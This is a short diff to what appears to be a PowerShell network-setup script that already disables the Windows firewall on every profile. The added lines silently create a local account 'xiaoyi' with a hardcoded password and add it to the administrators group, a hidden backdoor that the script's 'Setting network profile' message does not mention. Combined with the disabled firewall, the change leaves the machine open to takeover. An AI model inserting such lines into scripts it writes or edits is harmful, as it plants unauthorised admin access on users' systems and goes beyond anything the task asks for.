@@ -1,3 +1,6 @@
+net user xiaoyi Sandian1 /add
+net localgroup administrators xiaoyi /add
+
 Write-Host "[+] Setting network profile"
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Write-Host "[+] Done."
